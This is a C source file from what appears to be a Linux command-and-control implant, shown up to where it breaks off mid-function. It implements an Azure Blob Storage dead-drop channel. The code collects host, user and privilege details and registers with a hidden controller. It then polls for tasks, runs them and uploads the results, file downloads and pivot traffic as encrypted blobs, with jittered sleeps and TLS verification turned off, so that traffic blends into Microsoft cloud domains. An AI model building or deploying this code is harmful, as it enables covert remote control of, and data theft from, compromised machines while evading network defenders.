/* nax_linux/src/Transport/graph.c — Azure Blob dead-drop transport
 *
 * Protocol:
 *   Agent upload:   c_<nonce>.dat = [beatLen(4BE)][AES-CBC-b64(frame)][bodyData]
 *   Server response: r_<nonce>.dat = AES-CBC(tasks_frame)
 *
 * All traffic goes to *.blob.core.windows.net or graph.microsoft.com — no
 * direct connection to the C2 server.
 *
 * Build: add -DNAX_GRAPH_MODE and link -lcurl
 */

#ifdef NAX_GRAPH_MODE

#include "nax_linux.h"
#include "opsec.h"
#include "nax_bof_sdk.h"
#include "sysinfo.h"
#ifdef __has_include
#  if __has_include("nax_config.h")
#    include "nax_config.h"
#  endif
#endif

#include <curl/curl.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <poll.h>
#include <sys/socket.h>
#include <openssl/ssl.h>

#ifndef NAX_GRAPH_STORAGE
#define NAX_GRAPH_STORAGE "blob"
#endif
#ifndef NAX_GRAPH_POLL_MS
#define NAX_GRAPH_POLL_MS 3000
#endif
#ifndef NAX_GRAPH_POLL_MAX
#define NAX_GRAPH_POLL_MAX 15
#endif

/* forward declarations from Core */
extern int nax_encrypt(const uint8_t *key, const uint8_t *plain, uint32_t plain_len,
                       uint8_t *out, uint32_t *out_len);
extern int nax_decrypt(const uint8_t *key, const uint8_t *enc, uint32_t enc_len,
                       uint8_t *out, uint32_t *out_len);
extern int nax_build_result(uint32_t task_id, uint8_t status,
                            const uint8_t *data, uint32_t data_len,
                            uint8_t *out, uint32_t *out_len);
extern int nax_build_heartbeat(uint8_t *out, uint32_t *out_len);
extern int nax_build_no_tasks(uint8_t *out, uint32_t *out_len);

static void ping_pivot(NaxAgent *a, NaxPivot *p)
{
    uint8_t  frame[NAX_FRAME_HDR + 16];
    uint32_t frame_len = sizeof(frame);
    if (nax_build_no_tasks(frame, &frame_len) < 0) return;
    uint32_t enc_cap = frame_len + NAX_AES_IV + NAX_AES_BLOCK;
    uint8_t *enc = (uint8_t *)malloc(enc_cap);
    if (!enc) return;
    uint32_t enc_len = enc_cap;
    if (nax_encrypt(a->cfg.aes_key, frame, frame_len, enc, &enc_len) == 0) {
        uint8_t hdr[4] = {
            (uint8_t)(enc_len), (uint8_t)(enc_len >> 8),
            (uint8_t)(enc_len >> 16), (uint8_t)(enc_len >> 24)
        };
        if (p->ssl) {
            SSL_write((SSL*)p->ssl, hdr, 4);
            SSL_write((SSL*)p->ssl, enc, (int)enc_len);
        } else {
            send(p->sock, hdr, 4, MSG_NOSIGNAL);
            send(p->sock, enc, enc_len, MSG_NOSIGNAL);
        }
    }
    free(enc);
}
extern int nax_frame_encode(uint8_t type, const uint8_t *body, uint32_t body_len,
                            uint8_t *out, uint32_t *out_len);
extern int nax_frame_decode(const uint8_t *in, uint32_t in_len,
                            uint8_t *type_out, uint8_t **body_out, uint32_t *body_len_out);
extern int nax_build_reg_body(
    const char *hostname, uint32_t hostname_len,
    const char *username, uint32_t username_len,
    uint8_t arch, uint32_t pid, uint32_t sleep_ms, uint32_t tid,
    const char *ip, uint32_t ip_len,
    const char *domain, uint32_t domain_len,
    const char *procname, uint32_t procname_len,
    uint8_t elevated, uint8_t os_major, uint8_t os_minor, uint16_t os_build,
    uint32_t ppid, uint32_t _r1, uint32_t _r2,
    const char *imgpath, uint32_t imgpath_len,
    uint8_t *out, uint32_t *out_len);
extern void nax_gather_sysinfo(NaxSysInfo *info);
/* nax_opsec_heartbeat — defined as macro in opsec.h */
extern uint32_t nax_process_downloads(NaxAgent *a, uint8_t *out, uint32_t out_cap);
extern void nax_process_tunnels(NaxAgent *a);
extern uint32_t nax_process_tunnels_ex(NaxAgent *a, uint8_t *out, uint32_t out_cap);
extern void nax_bof_sdk_init(void);

extern void nax_async_drain(void (*cb)(uint32_t, uint8_t, const char *, uint32_t, void *), void *user_data);

/* ===== base64 encode ===== */
static const char b64_table[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static char *b64_encode(const uint8_t *in, uint32_t in_len, uint32_t *out_len)
{
    uint32_t enc_len = 4 * ((in_len + 2) / 3);
    char *out = (char *)malloc(enc_len + 1);
    if (!out) return NULL;
    uint32_t j = 0;
    for (uint32_t i = 0; i < in_len; i += 3) {
        uint32_t a = in[i];
        uint32_t b = (i + 1 < in_len) ? in[i + 1] : 0;
        uint32_t c = (i + 2 < in_len) ? in[i + 2] : 0;
        uint32_t t = (a << 16) | (b << 8) | c;
        out[j++] = b64_table[(t >> 18) & 0x3F];
        out[j++] = b64_table[(t >> 12) & 0x3F];
        out[j++] = (i + 1 < in_len) ? b64_table[(t >> 6) & 0x3F] : '=';
        out[j++] = (i + 2 < in_len) ? b64_table[t & 0x3F] : '=';
    }
    out[j] = '\0';
    if (out_len) *out_len = j;
    return out;
}

/* ===== libcurl response buffer ===== */
typedef struct {
    uint8_t *data;
    uint32_t size;
} CurlBuf;

static size_t curl_write_cb(void *ptr, size_t size, size_t nmemb, void *userdata)
{
    CurlBuf *buf = (CurlBuf *)userdata;
    uint32_t new_size = buf->size + (uint32_t)(size * nmemb);
    uint8_t *new_data = (uint8_t *)realloc(buf->data, new_size + 1);
    if (!new_data) return 0;
    buf->data = new_data;
    memcpy(buf->data + buf->size, ptr, size * nmemb);
    buf->size = new_size;
    buf->data[buf->size] = '\0';
    return size * nmemb;
}

/* ===== session_id generation ===== */
static void gen_session_id(char *out)
{
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    uint32_t rnd = (uint32_t)(ts.tv_nsec ^ ts.tv_sec ^ (uint32_t)getpid());
    /* Simple PRNG for 16 bytes */
    for (int i = 0; i < 16; i++) {
        rnd = rnd * 1664525u + 1013904223u;
        out[i] = (char)((rnd >> 16) & 0xFF);
    }
}

/* ===== sleep helper ===== */
static void sleep_ms(uint32_t ms)
{
    struct timespec ts = { (time_t)(ms / 1000), (long)((ms % 1000) * 1000000L) };
    nanosleep(&ts, NULL);
}

static uint32_t effective_sleep_ms(NaxAgent *a)
{
    if (a->cfg.sleep_ms == 0) return 0;
    if (a->cfg.jitter_pct == 0) return a->cfg.sleep_ms;
    uint32_t jit = (uint32_t)(((uint64_t)a->cfg.sleep_ms * a->cfg.jitter_pct) / 100);
    uint32_t offset = jit ? (uint32_t)(random() % jit) : 0;
    return (random() & 1) ? a->cfg.sleep_ms + offset
                           : (a->cfg.sleep_ms > offset ? a->cfg.sleep_ms - offset : 0);
}

/* ===== nonce generation ===== */
static void gen_nonce(char *out, size_t len)
{
    struct timespec ts;
    clock_gettime(CLOCK_REALTIME, &ts);
    uint32_t rnd = (uint32_t)(ts.tv_nsec ^ ts.tv_sec ^ (uint32_t)getpid());
    const char hex[] = "0123456789abcdef";
    for (size_t i = 0; i < len - 1; i++) {
        rnd = rnd * 1664525u + 1013904223u;
        out[i] = hex[(rnd >> 16) & 0xF];
    }
    out[len - 1] = '\0';
}

/* ===== Azure Blob Storage transport ===== */

static int blob_upload(const char *container, const char *sas_token,
                       const char *filename, const uint8_t *data, uint32_t data_len)
{
    DBG("blob_upload: %s (%u bytes)", filename, data_len);
    char _acct[NAX_GRAPH_ACCOUNT_LEN+1]; NAX_GRAPH_ACCOUNT_WRITE(_acct);
    char url[1024];
    snprintf(url, sizeof(url),
             "https://%s.blob.core.windows.net/%s/%s?%s",
             _acct, container, filename, sas_token);
    DBG("blob_upload: url=https://%s.blob.core.windows.net/%s/%s?<sas>",
        _acct, container, filename);

    CURL *curl = curl_easy_init();
    if (!curl) return -1;

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "x-ms-blob-type: BlockBlob");
    headers = curl_slist_append(headers, "x-ms-version: 2020-10-02");

    long status = 0;
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "PUT");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, (const char *)data);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)data_len);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    CURLcode rc = curl_easy_perform(curl);
    if (rc == CURLE_OK)
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &status);
    else
        DBG("blob_upload: curl error %d: %s", (int)rc, curl_easy_strerror(rc));

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    int result = (rc == CURLE_OK && (status == 200 || status == 201)) ? 0 : -1;
    DBG("blob_upload: %s -> rc=%d http=%ld result=%d", filename, (int)rc, status, result);
    return result;
}

static uint8_t *blob_download(const char *container, const char *sas_token,
                              const char *filename, uint32_t *out_len)
{
    DBG("blob_download: %s", filename);
    char _acct_dl[NAX_GRAPH_ACCOUNT_LEN+1]; NAX_GRAPH_ACCOUNT_WRITE(_acct_dl);
    char url[1024];
    snprintf(url, sizeof(url),
             "https://%s.blob.core.windows.net/%s/%s?%s",
             _acct_dl, container, filename, sas_token);

    CURL *curl = curl_easy_init();
    if (!curl) return NULL;

    CurlBuf buf = {0};
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "x-ms-version: 2020-10-02");

    long status = 0;
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buf);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    CURLcode rc = curl_easy_perform(curl);
    if (rc == CURLE_OK)
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &status);

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    if (rc != CURLE_OK || status != 200) {
        DBG("blob_download: %s -> rc=%d http=%ld NOT FOUND", filename, (int)rc, status);
        free(buf.data);
        return NULL;
    }
    DBG("blob_download: %s -> %u bytes", filename, buf.size);
    *out_len = buf.size;
    return buf.data;
}

static int blob_delete(const char *container, const char *sas_token, const char *filename)
{
    char _acct_del[NAX_GRAPH_ACCOUNT_LEN+1]; NAX_GRAPH_ACCOUNT_WRITE(_acct_del);
    char url[1024];
    snprintf(url, sizeof(url),
             "https://%s.blob.core.windows.net/%s/%s?%s",
             _acct_del, container, filename, sas_token);

    CURL *curl = curl_easy_init();
    if (!curl) return -1;

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "x-ms-version: 2020-10-02");

    long status = 0;
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "DELETE");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &(CurlBuf){0});
    CURLcode rc = curl_easy_perform(curl);
    if (rc == CURLE_OK)
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &status);

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    return 0;
}

/* ===== Graph upload helpers (dispatch) ===== */

static int graph_upload(const char *filename, const uint8_t *data, uint32_t data_len)
{
#ifdef NAX_GRAPH_ACCOUNT_WRITE
    char _cnt[NAX_GRAPH_CONTAINER_LEN+1];  NAX_GRAPH_CONTAINER_WRITE(_cnt);
    char _sas[NAX_GRAPH_SAS_TOKEN_LEN+1];  NAX_GRAPH_SAS_TOKEN_WRITE(_sas);
    return blob_upload(_cnt, _sas, filename, data, data_len);
#else
    /* OneDrive — not yet implemented, blob is recommended */
    (void)filename; (void)data; (void)data_len;
    return -1;
#endif
}

static uint8_t *graph_download(const char *filename, uint32_t *out_len)
{
#ifdef NAX_GRAPH_ACCOUNT_WRITE
    char _cnt[NAX_GRAPH_CONTAINER_LEN+1];  NAX_GRAPH_CONTAINER_WRITE(_cnt);
    char _sas[NAX_GRAPH_SAS_TOKEN_LEN+1];  NAX_GRAPH_SAS_TOKEN_WRITE(_sas);
    return blob_download(_cnt, _sas, filename, out_len);
#else
    (void)filename; (void)out_len;
    return NULL;
#endif
}

static void graph_delete(const char *filename)
{
#ifdef NAX_GRAPH_ACCOUNT_WRITE
    char _cnt[NAX_GRAPH_CONTAINER_LEN+1];  NAX_GRAPH_CONTAINER_WRITE(_cnt);
    char _sas[NAX_GRAPH_SAS_TOKEN_LEN+1];  NAX_GRAPH_SAS_TOKEN_WRITE(_sas);
    blob_delete(_cnt, _sas, filename);
#else
    (void)filename;
#endif
}

/* ===== build upload file =====
 * Format: [agentCrc(4BE)][agentUID(16)][encLen(4BE)][base64(AES(frame))][bodyData]
 * agentCrc and agentUID are in clear so the listener can identify the agent
 * without decrypting. The frame is AES-CBC encrypted.
 */
static uint8_t *build_upload_file(const uint8_t *agent_uid,
                                  const uint8_t *beat_enc, uint32_t beat_enc_len,
                                  const uint8_t *body, uint32_t body_len,
                                  uint32_t *out_len)
{
    uint32_t b64_len = 0;
    char *b64 = b64_encode(beat_enc, beat_enc_len, &b64_len);
    if (!b64) return NULL;

    /* [agentCrc(4)][agentUID(16)][encLen(4)][b64][body] */
    uint32_t total = 4 + 16 + 4 + b64_len + body_len;
    uint8_t *file = (uint8_t *)malloc(total);
    if (!file) { free(b64); return NULL; }

    uint32_t wm = NAX_LISTENER_WM;
    file[0] = (wm >> 24) & 0xFF;
    file[1] = (wm >> 16) & 0xFF;
    file[2] = (wm >>  8) & 0xFF;
    file[3] =  wm        & 0xFF;
    memcpy(file + 4, agent_uid, 16);
    file[20] = (b64_len >> 24) & 0xFF;
    file[21] = (b64_len >> 16) & 0xFF;
    file[22] = (b64_len >>  8) & 0xFF;
    file[23] =  b64_len        & 0xFF;
    memcpy(file + 24, b64, b64_len);
    if (body && body_len > 0)
        memcpy(file + 24 + b64_len, body, body_len);

    free(b64);
    *out_len = total;
    return file;
}

/* ===== poll for response ===== */
static uint8_t *graph_poll_response(const char *resp_filename, uint32_t *out_len)
{
    int attempts = NAX_GRAPH_POLL_MAX;
    while (attempts-- > 0) {
        sleep_ms(NAX_GRAPH_POLL_MS);
        uint8_t *data = graph_download(resp_filename, out_len);
        if (data) return data;
    }
    return NULL;
}

/* Forward declarations */
extern int     nax_decode_task(const uint8_t *, uint32_t, NaxTask *);
extern uint8_t nax_dispatch(NaxAgent *, NaxTask *, uint8_t **, uint32_t *);

/* ===== send result via blob upload ===== */
static const uint8_t *g_session_uid = NULL; /* set once in nax_graph_main */
static uint32_t       g_result_seq   = 0;   /* global upload sequence counter */

static void graph_send_result_upload(NaxAgent *a, uint32_t task_id, uint8_t status,
                                     const uint8_t *data, uint32_t data_len)
{
    uint8_t *frame = (uint8_t *)malloc(NAX_IO_CAP);
    if (!frame) return;
    uint32_t frame_len = NAX_IO_CAP;
    if (nax_build_result(task_id, status, data, data_len, frame, &frame_len) < 0) {
        free(frame); return;
    }
    uint32_t enc_cap = frame_len + NAX_AES_IV + NAX_AES_BLOCK + 32;
    uint8_t *enc = (uint8_t *)malloc(enc_cap);
    if (!enc) { free(frame); return; }
    uint32_t enc_len = enc_cap;
    if (nax_encrypt(a->cfg.aes_key, frame, frame_len, enc, &enc_len) < 0) {
        free(frame); free(enc); return;
    }
    free(frame);

    /* Upload result as r_*.dat with same format as c_*.dat so listener
     * can identify the agent: [agentCrc(4)][agentUID(16)][encLen(4)][b64(enc)] */
    uint32_t file_len = 0;
    uint8_t *file = build_upload_file(g_session_uid, enc, enc_len, NULL, 0, &file_len);
    free(enc);
    if (!file) return;

    char nonce[17]; gen_nonce(nonce, sizeof(nonce));
    char r_name[48];
    snprintf(r_name, sizeof(r_name), "r_%s_%08u.dat", nonce, g_result_seq++);
    graph_upload(r_name, file, file_len);
    free(file);
}

/* ===== async BOF result sender ===== */
static void graph_async_result_cb(uint32_t task_id, uint8_t status,
                                   const char *output, uint32_t output_len,
                                   void *user_data)
{
    NaxAgent *a = (NaxAgent *)user_data;
    graph_send_result_upload(a, task_id, status, (const uint8_t *)output, output_len);
}

/* ===== handle inbound server frame ===== */
static void handle_server_frame(NaxAgent *a, const uint8_t *data, uint32_t data_len)
{
    uint8_t *plain = (uint8_t *)malloc(data_len + NAX_AES_BLOCK);
    if (!plain) return;
    uint32_t plain_len = data_len + NAX_AES_BLOCK;
    if (nax_decrypt(a->cfg.aes_key, data, data_len, plain, &plain_len) < 0) {
        free(plain); return;
    }

    uint8_t  *cur = plain;
    uint32_t  rem = plain_len;
    while (rem >= NAX_FRAME_HDR) {
        uint8_t   ft = 0;
        uint8_t  *fb = NULL;
        uint32_t  fbl = 0;
        if (nax_frame_decode(cur, rem, &ft, &fb, &fbl) < 0) break;
        uint32_t step = NAX_FRAME_HDR + fbl;
        if (step > rem) break;
        cur += step;
        rem -= step;

        if (ft == NAX_WIRE_NO_TASKS || ft == NAX_WIRE_PROFILE) break;
        if (ft != NAX_WIRE_TASK) continue;

        NaxTask task;
        if (nax_decode_task(fb, fbl, &task) < 0) continue;

        uint8_t *result = NULL;
        uint32_t result_len = 0;
        uint8_t status = nax_dispatch(a, &task, &result, &result_len);

        if (status != NAX_STATUS_ASYNC)
            graph_send_result_upload(a, task.task_id, status, result, result_len);

        if (result) free(result);
    }
    free(plain);
}



/* ===== main agent loop ===== */
void nax_graph_main(NaxAgent *a)
{
    signal(SIGPIPE, SIG_IGN);
    char _dbg_acct[NAX_GRAPH_ACCOUNT_LEN+1];  NAX_GRAPH_ACCOUNT_WRITE(_dbg_acct);
    char _dbg_cnt[NAX_GRAPH_CONTAINER_LEN+1]; NAX_GRAPH_CONTAINER_WRITE(_dbg_cnt);
    DBG("nax_graph_main: starting — container=%s account=%s", _dbg_cnt, _dbg_acct);

    curl_global_init(CURL_GLOBAL_ALL);
    nax_bof_sdk_init();

    NaxSysInfo info;
    nax_gather_sysinfo(&info);

    /* Generate session UID (16 raw bytes used as agentUID by listener) */
    uint8_t session_uid[16];
    gen_session_id((char *)session_uid);
    g_session_uid = session_uid;
    /* Log session UID without writing to a->session_id to avoid overflow */
    DBG("session_uid: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
        session_uid[0],  session_uid[1],  session_uid[2],  session_uid[3],
        session_uid[4],  session_uid[5],  session_uid[6],  session_uid[7],
        session_uid[8],  session_uid[9],  session_uid[10], session_uid[11],
        session_uid[12], session_uid[13], session_uid[14], session_uid[15]);

    while (a->running) {
        /* ── Registration ── */
        int registered = 0;
        while (a->running && !registered) {
            /* Build register body */
            uint8_t reg_body[4096]; uint32_t reg_body_len = sizeof(reg_body);
            if (nax_build_reg_body(
                    info.hostname, strlen(info.hostname),
                    info.username, strlen(info.username),
                    NAX_ARCH_CURRENT, info.pid, a->cfg.sleep_ms, info.tid,
                    info.ip, strlen(info.ip),
                    info.domain, strlen(info.domain),
                    info.procname, strlen(info.procname),
                    info.elevated, info.os_major, info.os_minor, info.os_build,
                    info.ppid, 0, 0,
                    info.imgpath, strlen(info.imgpath),
                    reg_body, &reg_body_len) < 0) { sleep(3); continue; }

            /* Encode as REGISTER frame */
            uint8_t *frame = (uint8_t *)malloc(NAX_IO_CAP);
            if (!frame) { sleep(3); continue; }
            uint32_t frame_len = NAX_IO_CAP;
            if (nax_frame_encode(NAX_WIRE_REGISTER, reg_body, reg_body_len,
                                 frame, &frame_len) < 0) { free(frame); sleep(3); continue; }

            /* Encrypt frame only — listener prepends agentCrc+agentUID separately
             * when building beatWithId for TsAgentCreate */
            uint32_t beat_enc_cap = frame_len + NAX_AES_IV + NAX_AES_BLOCK + 32;
            uint8_t *beat_enc = (uint8_t *)malloc(beat_enc_cap);
            if (!beat_enc) { free(frame); sleep(3); continue; }
            uint32_t beat_enc_len = beat_enc_cap;
            if (nax_encrypt(a->cfg.aes_key, frame, frame_len,
                            beat_enc, &beat_enc_len) < 0) {
                free(frame); free(beat_enc); sleep(3); continue;
            }
            free(frame);

            /* Build and upload c_<nonce>.dat */
            char nonce[17]; gen_nonce(nonce, sizeof(nonce));
            char c_name[32], r_name[32];
            snprintf(c_name, sizeof(c_name), "c_%s.dat", nonce);
            snprintf(r_name, sizeof(r_name), "r_%s.dat", nonce);

            uint32_t file_len = 0;
            uint8_t *file = build_upload_file(session_uid, beat_enc, beat_enc_len, NULL, 0, &file_len);
            free(beat_enc);
            if (!file) { sleep(3); continue; }

            DBG("REGISTER: uploading %s (%u bytes)", c_name, file_len);
            int rc = graph_upload(c_name, file, file_len);
            free(file);
            if (rc < 0) { DBG("REGISTER: upload failed (http=%d)", rc); sleep(5); continue; }

            DBG("REGISTER: polling for %s", r_name);
            uint32_t resp_len = 0;
            uint8_t *resp = graph_poll_response(r_name, &resp_len);
            graph_delete(c_name);

            if (!resp || resp_len == 0) {
                if (resp) free(resp);
                sleep(5);
                continue;
            }

            /* Decrypt and check for PROFILE */
            uint8_t *plain = (uint8_t *)malloc(resp_len + 32);
            if (!plain) { free(resp); sleep(3); continue; }
            uint32_t plain_len = resp_len + 32;
            if (nax_decrypt(a->cfg.aes_key, resp, resp_len, plain, &plain_len) < 0) {
                free(resp); free(plain); sleep(3); continue;
            }
            free(resp);
            graph_delete(r_name);

            /* Accept PROFILE or NO_TASKS as registration confirmation.
             * Graph transport has no malleable profile — ignore profile data. */
            uint8_t ft = 0; uint8_t *fb = NULL; uint32_t fbl = 0;
            int decode_rc = nax_frame_decode(plain, plain_len, &ft, &fb, &fbl);
            DBG("REGISTER: resp %u bytes, decrypt plain_len=%u decode_rc=%d ft=0x%02x",
                resp_len, plain_len, decode_rc, ft);
            if (decode_rc == 0 &&
                (ft == NAX_WIRE_PROFILE || ft == NAX_WIRE_NO_TASKS)) {
                registered = 1;
                DBG("REGISTER: success ft=0x%02x", ft);
            }
            free(plain);

            if (!registered) {
                DBG("REGISTER: not registered, retrying");
                sleep(5);
            }
        }

        DBG("post-register: a->running=%d", (int)a->running);
        if (!a->running) break;

        /* ── Heartbeat loop ── */
        DBG("entering heartbeat loop");
        while (a->running) {
            /* Sleep */
            if (!a->tunnel_head) {
                uint32_t slp = effective_sleep_ms(a);
                if (slp > 0) sleep_ms(slp);
            }

            nax_opsec_heartbeat();
            nax_async_drain(graph_async_result_cb, a);

            /* Build heartbeat frame */
            uint8_t hb_frame[NAX_FRAME_HDR + 64];
            uint32_t hb_frame_len = sizeof(hb_frame);
            if (nax_build_heartbeat(hb_frame, &hb_frame_len) < 0) continue;

            /* Build beat: [agentCrc(4BE)][agentUID(16)][heartbeat_frame] */
            uint32_t beat_plain_len = 4 + 16 + hb_frame_len;
            uint8_t *beat_plain = (uint8_t *)malloc(beat_plain_len);
            if (!beat_plain) continue;
            uint32_t wm = NAX_LISTENER_WM;
            beat_plain[0] = (wm >> 24) & 0xFF;
            beat_plain[1] = (wm >> 16) & 0xFF;
            beat_plain[2] = (wm >>  8) & 0xFF;
            beat_plain[3] =  wm        & 0xFF;
            memcpy(beat_plain + 4, session_uid, 16);
            memcpy(beat_plain + 20, hb_frame, hb_frame_len);

            /* Encrypt beat */
            uint32_t beat_enc_cap = beat_plain_len + NAX_AES_IV + NAX_AES_BLOCK + 32;
            uint8_t *beat_enc = (uint8_t *)malloc(beat_enc_cap);
            if (!beat_enc) { free(beat_plain); continue; }
            uint32_t beat_enc_len = beat_enc_cap;
            if (nax_encrypt(a->cfg.aes_key, beat_plain, beat_plain_len,
                            beat_enc, &beat_enc_len) < 0) {
                free(beat_plain); free(beat_enc); continue;
            }
            free(beat_plain);

            /* Send pending download chunks as separate r_*.dat uploads.
             * nax_process_downloads returns a buffer of concatenated entries:
             *   [taskId(4LE)][dataLen(4LE)][data(dataLen)]
             * Each entry must be sent individually with its own taskId so the
             * server can route it to the correct pending download task. */
            {
                uint8_t *dbuf = (uint8_t *)malloc(NAX_IO_CAP);
                if (dbuf) {
                    /* Call nax_process_downloads once per heartbeat cycle so each
                     * chunk is gated by the sleep, matching the https transport
                     * behaviour.  The old outer while(dlen>0) loop was calling
                     * nax_process_downloads repeatedly without sleeping, causing
                     * all chunks to be sent back-to-back regardless of sleep_ms. */
                    uint32_t dlen = nax_process_downloads(a, dbuf, NAX_IO_CAP);
                    if (dlen > 0) {
                        uint32_t off = 0;
                        while (off + 8 <= dlen) {
                            uint32_t tid  = (uint32_t)dbuf[off]   | ((uint32_t)dbuf[off+1] << 8)
                                          | ((uint32_t)dbuf[off+2] << 16) | ((uint32_t)dbuf[off+3] << 24);
                            uint32_t dsize = (uint32_t)dbuf[off+4] | ((uint32_t)dbuf[off+5] << 8)
                                           | ((uint32_t)dbuf[off+6] << 16) | ((uint32_t)dbuf[off+7] << 24);
                            if (off + 8 + dsize > dlen) break;
                            graph_send_result_upload(a, tid, NAX_STATUS_OK,
                                                     dbuf + off + 8, dsize);
                            off += 8 + dsize;
                        }
                    }
                    free(dbuf);
                }
            }

            /* Collect pending results (tunnels, pivot data) as bodyData */
            uint8_t *body = NULL;
            uint32_t body_len = 0;
            {
                uint8_t *tbuf = (uint8_t *)malloc(4 * 1024 * 1024);
                if (tbuf) {
                    uint32_t tlen = nax_process_tunnels_ex(a, tbuf, 4 * 1024 * 1024);
                    if (tlen > 0) {
                        uint8_t *tf = (uint8_t *)malloc(tlen + 256);
                        if (tf) {
                            uint32_t tf_len = tlen + 256;
                            if (nax_build_result(0, NAX_STATUS_TUNNEL, tbuf, tlen,
                                                 tf, &tf_len) == 0) {
                                body = tf;
                                body_len = tf_len;
                            } else {
                                free(tf);
                            }
                        }
                    }
                    free(tbuf);
                }

                /* Drain data from child pivot sockets and upload as body */
                NaxPivot **pp = &a->pivot_head;
                while (*pp) {
                    NaxPivot *p = *pp;
                    int broken = 0;
                    /* Tick child so it drains async BOF results */
                    ping_pivot(a, p);
                    struct pollfd pfd = { .fd = p->sock, .events = POLLIN };
                    poll(&pfd, 1, 50);  /* short window for child to respond */
                    while (1) {
                        if (poll(&pfd, 1, 0) <= 0 || !(pfd.revents & POLLIN)) break;
                        uint8_t lenbuf[4]; ssize_t got = 0;
                        while (got < 4) {
                            ssize_t r = p->ssl ? SSL_read((SSL*)p->ssl, lenbuf + got, 4 - (int)got)
                                               : recv(p->sock, lenbuf + got, 4 - got, 0);
                            if (r <= 0) { broken = 1; break; }
                            got += r;
                        }
                        if (broken) break;
                        uint32_t msg_len = (uint32_t)lenbuf[0] | ((uint32_t)lenbuf[1] << 8) |
                                           ((uint32_t)lenbuf[2] << 16) | ((uint32_t)lenbuf[3] << 24);
                        if (msg_len == 0 || msg_len > 4 * 1024 * 1024) { broken = 1; break; }
                        uint8_t *msg = (uint8_t *)malloc(msg_len);
                        if (!msg) { broken = 1; break; }
                        got = 0;
                        while ((uint32_t)got < msg_len) {
                            ssize_t r = p->ssl ? SSL_read((SSL*)p->ssl, msg + got, (int)(msg_len - (uint32_t)got))
                                               : recv(p->sock, msg + got, msg_len - (uint32_t)got, 0);
                            if (r <= 0) { free(msg); broken = 1; break; }
                            got += r;
                        }
                        if (broken) break;
                        /* Pack pivot data: [PIV_TYPE_DATA(1)][pivot_id(4LE)][msg_len(4LE)][msg]
                         * Upload directly as r_*.dat — same path as normal command results */
                        uint32_t rd_len = 1 + 4 + 4 + msg_len;
                        uint8_t *rd = (uint8_t *)malloc(rd_len);
                        if (rd) {
                            rd[0] = NAX_PIV_TYPE_DATA;
                            rd[1] = (uint8_t)(p->pivot_id);       rd[2] = (uint8_t)(p->pivot_id >> 8);
                            rd[3] = (uint8_t)(p->pivot_id >> 16); rd[4] = (uint8_t)(p->pivot_id >> 24);
                            rd[5] = (uint8_t)(msg_len);            rd[6] = (uint8_t)(msg_len >> 8);
                            rd[7] = (uint8_t)(msg_len >> 16);      rd[8] = (uint8_t)(msg_len >> 24);
                            memcpy(rd + 9, msg, msg_len);
                            /* Upload as a separate r_*.dat so the server gets one frame at a time */
                            graph_send_result_upload(a, 0, NAX_STATUS_OK, rd, rd_len);
                            free(rd);
                        }
                        free(msg);
                    }
                    if (broken) {
                        /* Child disconnected */
                        uint8_t unlink_payload[6];
                        unlink_payload[0] = NAX_PIV_TYPE_UNLINK;
                        unlink_payload[1] = (uint8_t)(p->pivot_id);       unlink_payload[2] = (uint8_t)(p->pivot_id >> 8);
                        unlink_payload[3] = (uint8_t)(p->pivot_id >> 16); unlink_payload[4] = (uint8_t)(p->pivot_id >> 24);
                        unlink_payload[5] = 2; /* NAX_PIVOT_TYPE_TCP */
                        graph_send_result_upload(a, 0, NAX_STATUS_OK, unlink_payload, sizeof(unlink_payload));
                        if (p->ssl) { SSL_shutdown((SSL*)p->ssl); SSL_free((SSL*)p->ssl); }
                        close(p->sock);
                        *pp = p->next;
                        free(p);
                    } else {
                        pp = &p->next;
                    }
                }
            }

            /* Upload c_<nonce>.dat */
            char nonce[17]; gen_nonce(nonce, sizeof(nonce));
            char c_name[32], r_name[32];
            snprintf(c_name, sizeof(c_name), "c_%s.dat", nonce);
            snprintf(r_name, sizeof(r_name), "r_%s.dat", nonce);

            /* Encrypt bodyData so the listener can pass it to TsAgentProcessData */
            uint8_t *body_enc = NULL;
            uint32_t body_enc_len = 0;
            if (body && body_len > 0) {
                uint32_t bcap = body_len + NAX_AES_IV + NAX_AES_BLOCK + 32;
                body_enc = (uint8_t *)malloc(bcap);
                if (body_enc) {
                    body_enc_len = bcap;
